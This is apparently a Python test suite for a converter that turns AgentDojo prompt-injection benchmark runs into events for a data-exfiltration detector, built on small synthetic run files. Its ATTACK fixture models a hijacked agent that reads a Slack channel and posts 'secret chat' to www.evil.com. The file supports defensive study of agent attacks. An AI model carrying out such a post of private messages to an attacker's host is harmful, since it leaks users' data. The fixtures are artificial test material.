"""Tests for the AgentDojo converter. Runs here are tiny synthetic files shaped like
AgentDojo's published runs, not real benchmark data."""
import json
from pathlib import Path
import tempfile
import unittest

from scripts import convert_agentdojo as cad

MODELS = ('model-a', 'model-b')


def make_run(root, model, task, injection, calls, security=None, error=None, attack='important_instructions'):
    """Write one run file; calls are (function, args, tool_error) tuples."""
    folder = 'none' if injection == 'none' else attack
    name = 'none.json' if injection == 'none' else f'{injection}.json'
    path = Path(root) / model / 'slack' / task / folder / name
    path.parent.mkdir(parents=True, exist_ok=True)
    messages = [{'role': 'user', 'content': 'task'}]
    for i, (function, args, tool_error) in enumerate(calls):
        call = {'id': f'c{i}', 'function': function, 'args': args}
        messages.append({'role': 'assistant', 'content': None, 'tool_calls': [call]})
        messages.append({'role': 'tool', 'content': 'x', 'tool_call_id': f'c{i}', 'tool_call': call,
                         'error': tool_error})
    path.write_text(json.dumps({'messages': messages, 'security': security, 'error': error}))
    return path


NORMAL = [('get_channels', {}, None), ('get_webpage', {'url': 'www.ok.com'}, None)]
ATTACK = [('read_channel_messages', {'channel': 'general'}, None),
          ('post_webpage', {'url': 'www.evil.com', 'content': 'secret chat'}, None)]


def make_study(root, tasks=40):
    for model in MODELS:
        for t in range(tasks):
            task = f'user_task_{t}'
            make_run(root, model, task, 'none', NORMAL)
            make_run(root, model, task, 'injection_task_1', ATTACK, security=True)
            make_run(root, model, task, 'injection_task_2', ATTACK, security=False)


class MappingTests(unittest.TestCase):
    def test_mapping_follows_preregistered_table(self):
        self.assertEqual(cad.map_call('get_webpage', {'url': 'www.a.com'}, False), ('http', 'https://www.a.com', 0, False))
        self.assertEqual(cad.map_call('download_file', {'url': 'https://a.com/f', 'file_name': 'f'}, True),
                         ('http', 'https://a.com/f', 0, True))
        self.assertEqual(cad.map_call('post_webpage', {'url': 'a.com', 'content': 'héllo'}, False),
                         ('http', 'https://a.com', 6, False))
        self.assertEqual(cad.map_call('invite_user_to_slack', {'user': 'F', 'user_email': 'f@gmail.com'}, False),
                         ('http', 'https://gmail.com', 11, False))
        self.assertEqual(cad.map_call('read_inbox', {'user': 'Bob'}, False), ('read', '', 0, True))
        self.assertEqual(cad.map_call('read_channel_messages', {}, False), ('read', '', 0, True))
        self.assertEqual(cad.map_call('get_users_in_channel', {}, True), ('read', '', 0, False))
        self.assertEqual(cad.map_call('send_direct_message', {'body': 'hi'}, True), ('write', '', 0, False))
        self.assertEqual(cad.map_call('remove_user_from_slack', {}, False), ('write', '', 0, False))
        self.assertEqual(cad.map_call('<empty-function-name>', {}, False), ('read', '', 0, False))

    def test_as_url_adds_scheme_and_rejects_unparseable(self):
        self.assertEqual(cad.as_url('www.a.com/x'), 'https://www.a.com/x')
        self.assertEqual(cad.as_url('http://a.com'), 'http://a.com')
        self.assertEqual(cad.as_url('ftp://a.com'), '')
        self.assertEqual(cad.as_url(None), '')
        self.assertEqual(cad.as_url('   '), '')

    def test_taint_marks_outbound_calls_after_a_sensitive_read(self):
        run = json.loads(make_run(tempfile.mkdtemp(), 'm', 'user_task_0', 'none', [
            ('get_webpage', {'url': 'a.com'}, None), ('read_inbox', {}, None),
            ('post_webpage', {'url': 'b.com', 'content': 'x'}, None)]).read_text())
        events, unparsed = cad.convert_run(run, 's1')
        self.assertEqual([e['sensitive'] for e in events], [False, True, True])
        self.assertEqual([e['seq'] for e in events], [0, 1, 2])
        self.assertEqual(unparsed, 0)
        self.assertTrue(all(e['approved'] for e in events))

    def test_tool_error_sets_status_and_unparsed_urls_are_counted(self):
        run = json.loads(make_run(tempfile.mkdtemp(), 'm', 'user_task_0', 'none', [
            ('get_webpage', {'url': 'a.com'}, 'not found'), ('get_webpage', {'url': 'ftp://x'}, None)]).read_text())
        events, unparsed = cad.convert_run(run, 's1')
        self.assertEqual([e['status'] for e in events], ['error', 'ok'])
        self.assertEqual(events[1]['destination'], '')
        self.assertEqual(unparsed, 1)


class StudyTests(unittest.TestCase):
    def setUp(self):
        self.dir = tempfile.TemporaryDirectory()
        self.root = Path(self.dir.name)
        self.runs = self.root / 'runs'

    def tearDown(self):
        self.dir.cleanup()

    def test_collect_skips_error_runs_and_injection_task_runs(self):
        make_run(self.runs, 'm', 'user_task_0', 'none', NORMAL)
        make_run(self.runs, 'm', 'user_task_1', 'none', NORMAL, error='timeout')
        make_run(self.runs, 'm', 'injection_task_1', 'none', ATTACK)
        records, skipped = cad.collect(self.runs, ['m'], 'slack', 'important_instructions')
        self.assertEqual([r['session_id'] for r in records], ['m|user_task_0|none'])
        self.assertEqual(skipped, {'run error': 1})

    def test_study_scores_with_baseline_domains_and_refuses_a_second_run(self):
        make_study(self.runs)
        out = self.root / 'out'
        result = cad.run_study(self.runs, out, MODELS)
        self.assertEqual(result['approved_domains'], ['www.ok.com'])
        counts = result['counts']
        test_tasks = sum(side == 'test' for side in result['split'].values())
        self.assertEqual(counts['test_primary_normal'], 2 * test_tasks)
        self.assertEqual(counts['test_primary_actionable'], 2 * test_tasks)
        self.assertEqual(counts['test_secondary_attack_not_achieved'], 2 * test_tasks)
        self.assertEqual(counts['baseline'], 2 * (40 - test_tasks))
        rules = result['results']['rules_only']
        self.assertEqual((rules['tp'], rules['fp'], rules['fn']), (2 * test_tasks, 0, 0))
        # Baseline never contains attacked runs or test tasks.
        baseline_ids = {json.loads(l)['session_id'] for l in (out / 'baseline.jsonl').read_text().splitlines()}
        self.assertTrue(all(s.endswith('|none') for s in baseline_ids))
        self.assertTrue(all(result['split'][s.split('|')[1]] == 'baseline' for s in baseline_ids))
        with self.assertRaisesRegex(FileExistsError, 'already exists'):
            cad.run_study(self.runs, out, MODELS)

    def test_existing_output_folder_is_refused_before_anything_is_written(self):
        make_study(self.runs)
        out = self.root / 'out'
        out.mkdir()
        (out / 'baseline.jsonl').write_text('other study\n')
        with self.assertRaisesRegex(FileExistsError, 'already exists'):
            cad.run_study(self.runs, out, MODELS)
        self.assertEqual((out / 'baseline.jsonl').read_text(), 'other study\n')
        self.assertEqual(sorted(p.name for p in out.iterdir()), ['baseline.jsonl'])

    def test_failed_validation_leaves_no_output_folder(self):
        make_study(self.runs, tasks=6)
        out = self.root / 'out'
        with self.assertRaises(ValueError):
            cad.run_study(self.runs, out, MODELS)
        self.assertFalse(out.exists())

    def test_split_is_deterministic_by_user_task(self):
        make_study(self.runs, tasks=10)
        records, _ = cad.collect(self.runs, MODELS, 'slack', 'important_instructions')
        first = cad.split_tasks(records, seed=0, baseline_fraction=0.5)
        self.assertEqual(first, cad.split_tasks(list(reversed(records)), seed=0, baseline_fraction=0.5))
        self.assertEqual(set(first), {f'user_task_{t}' for t in range(10)})

    def test_small_baseline_is_refused(self):
        make_study(self.runs, tasks=6)
        with self.assertRaisesRegex(ValueError, 'baseline'):
            cad.run_study(self.runs, self.root / 'out', MODELS)

    def test_cli_returns_error_code_on_bad_input(self):
        code = cad.main(['--runs', str(self.root / 'missing'), '--output', str(self.root / 'out'), '--model', 'm'])
        self.assertEqual(code, 2)


if __name__ == '__main__':
    unittest.main()
